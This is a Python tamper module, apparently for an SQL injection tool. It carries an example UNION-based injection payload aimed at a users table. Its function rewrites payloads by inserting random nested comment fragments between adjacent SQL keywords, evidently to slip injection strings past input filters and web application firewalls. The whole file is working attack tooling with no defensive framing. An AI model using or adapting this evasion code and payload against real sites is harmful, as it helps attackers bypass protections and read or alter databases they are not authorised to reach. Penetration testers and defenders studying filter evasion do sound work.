import random
import re

__example_payload__ = "' UNION SELECT NULL FROM users--"
__type__ = "inject nested multi-line comment fragments between SQL keywords"
__category__ = "sqli"
__chain_stage__ = "lexical"
__contexts__ = ("query", "form")

_KEYWORD = (
    r"SELECT|UNION|FROM|WHERE|AND|OR|INSERT|UPDATE|DELETE|NULL|ORDER"
    r"|GROUP|HAVING|JOIN|ON|AS|LIMIT|LIKE|INTO|VALUES|SET|NOT|EXISTS"
    r"|CASE|WHEN|THEN|ELSE|END"
)
# insert a fragment between two adjacent keywords, e.g. UNION SELECT
_INSERT = re.compile(
    r"\b({})\s+(?=(?:{})\b)".format(_KEYWORD, _KEYWORD), re.I
)
_FRAGMENTS = ("/*/**/**/", "/*/**//**/", "/**/*/**/", "/*!/**/")


def tamper(payload, **kwargs):
    if not payload:
        return payload

    def _fill(match):
        return "{} {}".format(match.group(1), random.choice(_FRAGMENTS))

    return _INSERT.sub(_fill, str(payload))
